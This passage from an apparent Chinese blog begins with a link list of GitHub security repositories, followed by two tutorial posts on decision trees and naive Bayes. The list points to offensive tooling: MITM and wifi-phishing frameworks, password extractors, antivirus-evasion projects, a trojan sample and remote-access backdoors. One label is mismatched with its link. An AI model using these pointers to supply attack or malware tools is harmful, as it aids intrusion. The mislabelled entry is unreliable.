+<p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):<br><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a></p>
+<p>php7缓存覆写漏洞Demo及相关工具:<br><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p>
+<p>XcodeGhost木马样本:<br><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p>
+<h2 id="中间人攻击及钓鱼"><a href="#中间人攻击及钓鱼" class="headerlink" title="中间人攻击及钓鱼"></a>中间人攻击及钓鱼</h2><p>中间人攻击框架:<br><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a><br><a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy</a><br><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf</a></p>
+<p>Inject code, jam wifi, and spy on wifi users:<br><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a></p>
+<p>中间人代理工具:<br><a href="https://github.com/intrepidusgroup/mallory" target="_blank" rel="noopener">https://github.com/intrepidusgroup/mallory</a></p>
+<p>wifi钓鱼:<br><a href="https://github.com/sophron/wifiphisher" target="_blank" rel="noopener">https://github.com/sophron/wifiphisher</a></p>
+<h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><p>密码破解工具:<br><a href="https://github.com/shinnok/johnny" target="_blank" rel="noopener">https://github.com/shinnok/johnny</a></p>
+<p>本地存储的各类密码提取利器:<br><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p>
+<h2 id="二进制及代码分析工具"><a href="#二进制及代码分析工具" class="headerlink" title="二进制及代码分析工具"></a>二进制及代码分析工具</h2><p>二进制分析工具<br><a href="https://github.com/devttys0/binwalk" target="_blank" rel="noopener">https://github.com/devttys0/binwalk</a></p>
+<p>系统扫描器<br><a href="https://github.com/quarkslab/binmap" target="_blank" rel="noopener">https://github.com/quarkslab/binmap</a></p>
+<p>rp:<br><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p>
+<p>Windows Exploit Development工具<br><a href="https://github.com/lillypad/badger" target="_blank" rel="noopener">https://github.com/lillypad/badger</a></p>
+<p>二进制静态分析工具（python）:<br><a href="https://github.com/bdcht/amoco" target="_blank" rel="noopener">https://github.com/bdcht/amoco</a></p>
+<p>Python Exploit Development Assistance for GDB:<br><a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a></p>
+<p>对BillGates Linux Botnet系木马活动的监控工具<br><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="noopener">https://github.com/ValdikSS/billgates-botnet-tracker</a></p>
+<p>木马配置参数提取工具:<br><a href="https://github.com/kevthehermit/RATDecoders" target="_blank" rel="noopener">https://github.com/kevthehermit/RATDecoders</a></p>
+<p>Shellphish编写的二进制分析工具（CTF向）:<br><a href="https://github.com/angr/angr" target="_blank" rel="noopener">https://github.com/angr/angr</a></p>
+<p>针对python的静态代码分析工具:<br><a href="https://github.com/yinwang0/pysonar2" target="_blank" rel="noopener">https://github.com/yinwang0/pysonar2</a></p>
+<p>一个自动化的脚本（shell）分析工具，用来给出警告和建议:<br><a href="https://github.com/koalaman/shellcheck" target="_blank" rel="noopener">https://github.com/koalaman/shellcheck</a></p>
+<p>基于AST变换的简易Javascript反混淆辅助工具:<br><a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="noopener">https://github.com/ChiChou/etacsufbo</a></p>
+<h2 id="EXP编写框架及工具"><a href="#EXP编写框架及工具" class="headerlink" title="EXP编写框架及工具"></a>EXP编写框架及工具</h2><p>二进制EXP编写工具:<br><a href="https://github.com/t00sh/rop-tool" target="_blank" rel="noopener">https://github.com/t00sh/rop-tool</a></p>
+<p>CTF Pwn 类题目脚本编写框架:<br><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p>
+<p>an easy-to-use io library for pwning development:<br><a href="https://github.com/zTrix/zio" target="_blank" rel="noopener">https://github.com/zTrix/zio</a></p>
+<p>跨平台注入工具:<br><a href="https://github.com/frida/frida" target="_blank" rel="noopener">https://github.com/frida/frida</a></p>
+<p>哈希长度扩展攻击EXP：<br><a href="https://github.com/citronneur/rdpy" target="_blank" rel="noopener">https://github.com/citronneur/rdpy</a></p>
+<h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>隐写检测工具<br><a href="https://github.com/abeluck/stegdetect" target="_blank" rel="noopener">https://github.com/abeluck/stegdetect</a></p>
+<h2 id="各类安全资料"><a href="#各类安全资料" class="headerlink" title="各类安全资料:"></a>各类安全资料:</h2><p>data_hacking合集:<br><a href="https://github.com/ClickSecurity/data_hacking" target="_blank" rel="noopener">https://github.com/ClickSecurity/data_hacking</a></p>
+<p>mobile-security-wiki:<br><a href="https://github.com/exploitprotocol/mobile-security-wiki" target="_blank" rel="noopener">https://github.com/exploitprotocol/mobile-security-wiki</a></p>
+<p>书籍《reverse-engineering-for-beginners》:<br><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="noopener">https://github.com/veficos/reverse-engineering-for-beginners</a></p>
+<p>一些信息安全标准及设备配置:<br><a href="https://github.com/luyg24/IT_security" target="_blank" rel="noopener">https://github.com/luyg24/IT_security</a></p>
+<p>APT相关笔记:<br><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="noopener">https://github.com/kbandla/APTnotes</a></p>
+<p>Kcon资料:<br><a href="https://github.com/knownsec/KCon" target="_blank" rel="noopener">https://github.com/knownsec/KCon</a></p>
+<p>《DO NOT FUCK WITH A HACKER》:<br><a href="https://github.com/citypw/DNFWAH" target="_blank" rel="noopener">https://github.com/citypw/DNFWAH</a></p>
+<p>各类安全脑洞图：<br><a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">https://github.com/phith0n/Mind-Map</a></p>
+<p>信息安全流程图：<br><a href="https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428" target="_blank" rel="noopener">https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428</a></p>
+<h2 id="各类CTF资源"><a href="#各类CTF资源" class="headerlink" title="各类CTF资源"></a>各类CTF资源</h2><p>近年ctf writeup大全:<br><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2016</a><br><a href="https://github.com/ctfs/write-ups-2015" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015</a><br><a href="https://github.com/ctfs/write-ups-2014" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014</a></p>
+<p>fbctf竞赛平台Demo:<br><a href="https://github.com/facebook/fbctf" target="_blank" rel="noopener">https://github.com/facebook/fbctf</a></p>
+<p>ctf Resources:<br><a href="https://github.com/ctfs/resources" target="_blank" rel="noopener">https://github.com/ctfs/resources</a></p>
+<p>ctf及黑客资源合集:<br><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p>
+<p>ctf和安全工具大合集:<br><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p>
+<p>ctf向 python工具包<br><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a></p>
+<h2 id="各类编程资源"><a href="#各类编程资源" class="headerlink" title="各类编程资源"></a>各类编程资源</h2><p>大礼包（什么都有）:<br><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="noopener">https://github.com/bayandin/awesome-awesomeness</a></p>
+<p>bash-handbook:<br><a href="https://github.com/denysdovhan/bash-handbook" target="_blank" rel="noopener">https://github.com/denysdovhan/bash-handbook</a></p>
+<p>python资源大全:<br><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="noopener">https://github.com/jobbole/awesome-python-cn</a></p>
+<p>git学习资料:<br><a href="https://github.com/xirong/my-git" target="_blank" rel="noopener">https://github.com/xirong/my-git</a></p>
+<p>安卓开源代码解析<br><a href="https://github.com/android-cn/android-open-project" target="_blank" rel="noopener">https://github.com/android-cn/android-open-project</a></p>
+<p>python框架，库，资源大合集:<br><a href="https://github.com/vinta/awesome-python" target="_blank" rel="noopener">https://github.com/vinta/awesome-python</a></p>
+<p>JS 正则表达式库（用于简化构造复杂的JS正则表达式）:<br><a href="https://github.com/VerbalExpressions/JSVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p>
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>python 正则表达式库（用于简化构造复杂的python正则表达式）:<br><a href="https://github.com/VerbalExpressions/" target="_blank" rel="noopener">https://github.com/VerbalExpressions/</a></p>
+<p>python任务管理以及命令执行库:<br><a href="https://github.com/pyinvoke/invoke" target="_blank" rel="noopener">https://github.com/pyinvoke/invoke</a></p>
+<p>python exe打包库:<br><a href="https://github.com/pyinstaller/pyinstaller" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller</a></p>
+<p>Veil-Evasion免杀项目：<br><a href="https://github.com/Veil-Framework/Veil-Evasion" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil-Evasion</a></p>
+<p>py3 爬虫框架:<br><a href="https://github.com/orf/cyborg" target="_blank" rel="noopener">https://github.com/orf/cyborg</a></p>
+<p>一个提供底层接口数据包编程和网络协议支持的python库:<br><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket</a></p>
+<p>python requests 库:<br><a href="https://github.com/kennethreitz/requests" target="_blank" rel="noopener">https://github.com/kennethreitz/requests</a></p>
+<p>python 实用工具合集:<br><a href="https://github.com/mahmoud/boltons" target="_blank" rel="noopener">https://github.com/mahmoud/boltons</a></p>
+<p>python爬虫系统:<br><a href="https://github.com/binux/pyspider" target="_blank" rel="noopener">https://github.com/binux/pyspider</a></p>
+<h2 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h2><p>科学上网工具<br><a href="https://github.com/XX-net/XX-Net" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net</a></p>
+<h2 id="福利"><a href="#福利" class="headerlink" title="福利"></a>福利</h2><p>微信自动抢红包动态库<br><a href="https://github.com/east520/AutoGetRedEnv" target="_blank" rel="noopener">https://github.com/east520/AutoGetRedEnv</a></p>
+<p>微信抢红包插件（安卓版）<br><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney" target="_blank" rel="noopener">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a></p>
+<p>hardsed神器:<br><a href="https://github.com/yangyangwithgnu/hardseed" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/hardseed</a></p>
+<h2 id="甲方安全工程师生存指南"><a href="#甲方安全工程师生存指南" class="headerlink" title="甲方安全工程师生存指南"></a>甲方安全工程师生存指南</h2><p>web索引及日志搜索工具：<br><a href="https://github.com/thomaspatzke/WASE" target="_blank" rel="noopener">https://github.com/thomaspatzke/WASE</a></p>
+<p>开源日志采集器：<br><a href="https://github.com/wgliang/logcool" target="_blank" rel="noopener">https://github.com/wgliang/logcool</a></p>
+<p>扫描CS结构的web debuger<br><a href="https://github.com/Kozea/wdb" target="_blank" rel="noopener">https://github.com/Kozea/wdb</a></p>
+<p>恢复sqlite数据库删除注册信息：<br><a href="https://github.com/aramosf/recoversqlite/" target="_blank" rel="noopener">https://github.com/aramosf/recoversqlite/</a></p>
+<p>gps欺骗检测工具:<br><a href="https://github.com/zxsecurity/gpsnitch" target="_blank" rel="noopener">https://github.com/zxsecurity/gpsnitch</a></p>
+<p>应急处置响应框架:<br><a href="https://github.com/biggiesmallsAG/nightHawkResponse" target="_blank" rel="noopener">https://github.com/biggiesmallsAG/nightHawkResponse</a></p>
+<p>web安全开发指南:<br><a href="https://github.com/FallibleInc/security-guide-for-developers" target="_blank" rel="noopener">https://github.com/FallibleInc/security-guide-for-developers</a></p>
+<p>各个知名厂商漏洞测试报告模板：<br><a href="https://github.com/juliocesarfort/public-pentesting-reports" target="_blank" rel="noopener">https://github.com/juliocesarfort/public-pentesting-reports</a></p>
+<p>linux下恶意代码检测包：<br><a href="https://github.com/rfxn/linux-malware-detect" target="_blank" rel="noopener">https://github.com/rfxn/linux-malware-detect</a></p>
+<p>操作系统运行指标可视化框架：<br><a href="https://github.com/facebook/osquery" target="_blank" rel="noopener">https://github.com/facebook/osquery</a></p>
+<p>恶意代码分析系统：<br><a href="https://github.com/cuckoosandbox/cuckoo" target="_blank" rel="noopener">https://github.com/cuckoosandbox/cuckoo</a></p>
+<p>定期搜索及存储web应用：<br><a href="https://github.com/Netflix/Scumblr" target="_blank" rel="noopener">https://github.com/Netflix/Scumblr</a></p>
+<p>事件响应框架：<br><a href="https://github.com/google/grr" target="_blank" rel="noopener">https://github.com/google/grr</a></p>
+<p>综合主机监控检测平台：<br><a href="https://github.com/ossec/ossec-hids" target="_blank" rel="noopener">https://github.com/ossec/ossec-hids</a></p>
+<p>分布式实时数字取证系统：<br><a href="https://github.com/mozilla/mig" target="_blank" rel="noopener">https://github.com/mozilla/mig</a></p>
+<p>Microsoft &amp; Unix 文件系统及硬盘取证工具：<br><a href="https://github.com/sleuthkit/sleuthkit" target="_blank" rel="noopener">https://github.com/sleuthkit/sleuthkit</a></p>
+<h2 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h2><p>SSH蜜罐：<br><a href="https://github.com/desaster/kippo" target="_blank" rel="noopener">https://github.com/desaster/kippo</a></p>
+<p>蜜罐集合资源：<br><a href="https://github.com/paralax/awesome-honeypots" target="_blank" rel="noopener">https://github.com/paralax/awesome-honeypots</a></p>
+<p>kippo进阶版蜜罐：<br><a href="https://github.com/micheloosterhof/cowrie" target="_blank" rel="noopener">https://github.com/micheloosterhof/cowrie</a></p>
+<p>SMTP 蜜罐：<br><a href="https://github.com/awhitehatter/mailoney" target="_blank" rel="noopener">https://github.com/awhitehatter/mailoney</a></p>
+<p>web应用程序蜜罐：<br><a href="https://github.com/mushorg/glastopf" target="_blank" rel="noopener">https://github.com/mushorg/glastopf</a></p>
+<p>数据库蜜罐：<br><a href="https://github.com/jordan-wright/elastichoney" target="_blank" rel="noopener">https://github.com/jordan-wright/elastichoney</a></p>
+<p>web蜜罐：<br><a href="https://github.com/atiger77/Dionaea" target="_blank" rel="noopener">https://github.com/atiger77/Dionaea</a></p>
+<h2 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h2><p>用gmail充当C&amp;C服务器的后门<br><a href="https://github.com/byt3bl33d3r/gcat" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/gcat</a></p>
+<p>开源的远控：<br><a href="https://github.com/UbbeLoL/uRAT" target="_blank" rel="noopener">https://github.com/UbbeLoL/uRAT</a></p>
+<p>c#远控：<br><a href="https://github.com/hussein-aitlahcen/BlackHole" target="_blank" rel="noopener">https://github.com/hussein-aitlahcen/BlackHole</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/24/机器学习-11-——决策树/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/12/24/机器学习-11-——决策树/" itemprop="url">
+                  机器学习(11)——决策树
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-24T23:52:53+08:00">
+                2018-12-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/机器学习/" itemprop="url" rel="index">
+                    <span itemprop="name">机器学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/12/24/机器学习-11-——决策树/" class="leancloud_visitors" data-flag-title="机器学习(11)——决策树">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-决策树"><a href="#0x00-决策树" class="headerlink" title="0x00 决策树"></a>0x00 决策树</h2><p>决策树在机器学习中是一种经典的分类算法。决策树的结构是一个树结构(可以是二叉树或非二叉树)。其中每个非叶节点表示一个特征属性上的测试，每个分支代表这个特证属性在某个值域上的输出，而每个叶子节点存放一个类别。使用决策树进行决策的过程就是从根节点开始，测试待分类项中相应的特征属性，并按照其值选择输出分支，直到到达叶子节点，此时叶子节点上的类别就是决策结果。</p>
+<p>举个例子，假如我们要判断一只动物是不是兔子，这是典型的二分类问题，结果只有是兔子和不是兔子两种。我们可以用来判断的特征有：四条腿走路、耳朵、体型、尾巴等很多信息，这些特征都位于非叶节点，我们输入一个新的动物，就可以通过这些特征来一步步走向分类的叶子节点。</p>
+<h2 id="0x01-决策树过程描述"><a href="#0x01-决策树过程描述" class="headerlink" title="0x01 决策树过程描述"></a>0x01 决策树过程描述</h2><p>具体过程如下图</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml11_01.png?raw=true" alt=""></p>
+<p>最重要的问题在于第八行中如何选择这个最优属性，什么是最优属性呢？就是说这个属性要做到尽量多的降低不确定性，为了找出算哪个属性才能降低最多不确定性，就需要引入信息熵的概念了。</p>
+<h2 id="0x02-信息熵与信息增益"><a href="#0x02-信息熵与信息增益" class="headerlink" title="0x02 信息熵与信息增益"></a>0x02 信息熵与信息增益</h2><h4 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h4><p>在看信息熵之前我们先看一下香农对信息的定义：信息是用来消除随机不确定性的东西。</p>
+<h4 id="信息的衡量-信息熵"><a href="#信息的衡量-信息熵" class="headerlink" title="信息的衡量-信息熵"></a>信息的衡量-信息熵</h4><p>信息熵指一个信息能够消除不确定性的大小</p>
+<p>信息熵的定义式：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml11_02.png?raw=true" alt=""></p>
+<p>条件熵计算：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml11_04.png?raw=true" alt=""></p>
+<h4 id="信息增益"><a href="#信息增益" class="headerlink" title="信息增益"></a>信息增益</h4><p>特征A对训练数据集D的信息增益g(D,A)，定义为集合D的信息熵H(D)与特征A给定条件下D的信息条件熵H(D|A)之差，公式为：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml11_03.png?raw=true" alt=""></p>
+<p>随着决策树的每层进行，我们希望决策树分支节点所包含的样本尽可能的属于同一类别，也就是说“纯度”越来越高，而信息增益越大，意味着使用这个属性对决策树的“纯度”提升越大。</p>
+<p>所以，我们根据这里计算出来的信息增益的大小，就可以解决选择最优属性的问题。</p>
+<h2 id="0x03-剪枝处理"><a href="#0x03-剪枝处理" class="headerlink" title="0x03 剪枝处理"></a>0x03 剪枝处理</h2><p>剪枝是决策树中应对过拟合的手段，在决策树学习中由于划分过程不断重复，有时会造成决策树分支过多，这种情况下一些训练集的特点会被当作所有数据都具有的一般性质而导致过拟合。需要进行剪枝处理。</p>
+<p>决策树的剪枝策略分为预剪枝和后剪枝。</p>
+<ul>
+<li>预剪枝是指在决策树的生成过程中，对每个节点在划分前先进行估计。若当前结点的划分不能带来决策树泛化性能提升，则停止划分并将当前结点标记为叶子结点。</li>
+<li>后剪枝是从训练集生成一颗完整的决策树，然后自底向上对非叶结点进行考察，如果将该结点替换成叶结点会提升泛化性能，则替换。</li>
+</ul>
+<h2 id="0x04-连续值处理"><a href="#0x04-连续值处理" class="headerlink" title="0x04 连续值处理"></a>0x04 连续值处理</h2><p>实际情况中，我们遇到的属性并不一定都是像“有无尾巴”等这样离散的，有一部分属性是连续的数值如“质量”、“密度”等等。这种情况下由于连续值是无限多的，不能分别作为结点，所以就要采取一定的策略对连续属性进行处理。</p>
+<p>最常用的策略是二分法，首先我们假设在样本D中有n个不同的取值，将他们从小到大进行排序，记为{a1、a2、···an}，然后取每两个相邻点的平均值</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml11_05.png?raw=true" alt=""></p>
+<p>共n-1个值作为候选划分点，然后用考察离散属性值的方法来选取最优划分点来进行集合的划分。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/22/机器学习-10-——贝叶斯分类/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/12/22/机器学习-10-——贝叶斯分类/" itemprop="url">
+                  机器学习(10)——贝叶斯分类
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-22T23:07:50+08:00">
+                2018-12-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/机器学习/" itemprop="url" rel="index">
+                    <span itemprop="name">机器学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/12/22/机器学习-10-——贝叶斯分类/" class="leancloud_visitors" data-flag-title="机器学习(10)——贝叶斯分类">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-贝叶斯分类"><a href="#0x00-贝叶斯分类" class="headerlink" title="0x00 贝叶斯分类"></a>0x00 贝叶斯分类</h2><p>贝叶斯分类算法是统计学的一种分类方法，它是一类利用概率统计知识进行分类的算法。在许多场合，朴素贝叶斯(Naïve Bayes，NB)分类算法可以与决策树和神经网络分类算法相媲美，该算法能运用到大型数据库中，而且方法简单、分类准确率高、速度快。</p>
+<h2 id="0x01-贝叶斯决策论"><a href="#0x01-贝叶斯决策论" class="headerlink" title="0x01 贝叶斯决策论"></a>0x01 贝叶斯决策论</h2><p>在分类任务中，我们不一定会得到明确的分类结果，而是得到可能被划分到每一种分类的概率。贝叶斯决策论就是用来决定出这个分类结果的方法。</p>
+<p>贝叶斯决策论是概率框架下实施决策的基本方法，对分类任务来说，在所有相关概率都已知的情况下，贝叶斯决策论考虑如何基于这些概率和误判损失来选择最优类别标记。</p>
+<h2 id="0x02-贝叶斯公式"><a href="#0x02-贝叶斯公式" class="headerlink" title="0x02 贝叶斯公式"></a>0x02 贝叶斯公式</h2><p>贝叶斯公式：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml10_01.png?raw=true" alt=""></p>
+<p>其中</p>
+<ul>
+<li>P(A|B) 是在 B 发生的情况下 A 发生的概率；</li>
+<li>P(A) 是 A 发生的概率；</li>
+<li>P(B|A) 是在 A 发生的情况下 B 发生的概率；</li>
+<li>P(B) 是 B 发生的概率。</li>
+</ul>
+<p>我们可以通过一个例子来解释这个公式，假设我们知道这几个概率：</p>
+<ul>
+<li>50%的下雨天早上是多云</li>
+<li>但是多云天气很多（40%的日子早上都是多云）</li>
+<li>这个月不怎么下雨（平均30天只有3天下雨，10%的下雨几率）</li>
+</ul>
+<p>然后，早晨起来发现天气是多云，怎么知道今天下雨的概率是多少？</p>
+<p>我们在这里用P(雨)代表下雨，P(云)代表多云，那么我们要求的事件就是：早晨多云的情况下下雨的概率是多少，也就是P(雨|云)。</p>
+<p>然后我们就可以套用在贝叶斯公式中：</p>
+<p>P(雨|云)=P（云|雨）* P（雨）/ P（云）</p>
+<p>而通过前面的条件已经知道，P（云|雨）=0.5，P（雨）=0.1，P（云）=0.4，那么我们就可以算出早晨多云的情况下下雨的概率是0.5*0.1/0.4=0.125。只有1/8的概率下雨。</p>
+<p>这是贝叶斯公式的一个简单应用，但在实际任务中我们的事件会更多更复杂，也就是说不会是单纯的P（雨）、P（云）这么简单的单一事件，而是多个事件的联合概率，这个时候联合概率在样本不足的情况下无法直接计算，所以我们就引入了朴素贝叶斯分类方法。</p>
+<h2 id="0x03-朴素贝叶斯分类"><a href="#0x03-朴素贝叶斯分类" class="headerlink" title="0x03 朴素贝叶斯分类"></a>0x03 朴素贝叶斯分类</h2><p>也就是说朴素贝叶斯这一方法，是由于实际情况中，我们难以从有限的样本中直接获得在所有属性上的联合类条件概率而引出的，那么朴素贝叶斯方法是这样解决联合条件概率问题的：</p>
+<p>朴素贝叶斯分类器对所有已知类别，假设所有属性相互独立。也就是说每个属性独立的对分类结果进行影响。</p>
+<p>当所有属性都独立的时候，联合概率就变为了：</p>
+<p>P(A,B)=P(A)*P(B)</p>
+<p>这样我们就可以很轻易的使用已知样本中得到的单一概率来一步步算出所需的类条件概率P(B|A)了。</p>
+<p>此时，贝叶斯公式可写为：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml10_02.png?raw=true" alt=""></p>
+<p>其中d为属性数目，Bi为B在第i个属性上的取值。</p>
+<p>而对所有类别P(B)相同，因此贝叶斯准则为：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml10_03.png?raw=true" alt=""></p>
+<p>这就是朴素贝叶斯分类器的表达式。</p>
+<p>其中arg数学含义：</p>
+<p>argument of the maximum/minimum<br>arg max f(x): 当f(x)取最大值时，x的取值<br>arg min f(x): 当f(x)取最小值时，x的取值</p>
+<p>我们只需在训练过程中基于训练集来估计类先验概率P(A),并为每个属性估计条件概率P(Bi|A)即可。</p>
+<p>然后我们就根据计算出来的概率大小来判断属于哪一类。</p>
+<h2 id="0x04-半朴素贝叶斯分类器"><a href="#0x04-半朴素贝叶斯分类器" class="headerlink" title="0x04 半朴素贝叶斯分类器"></a>0x04 半朴素贝叶斯分类器</h2><p>朴素贝叶斯分类使用条件独立性假设降低了后验概率计算的困难，但是这个假设是很难成立的，因为很多属性之间本来就具有很高的依赖性，所以就产生了一种“半朴素贝叶斯分类器”的方法来进行改善。</p>
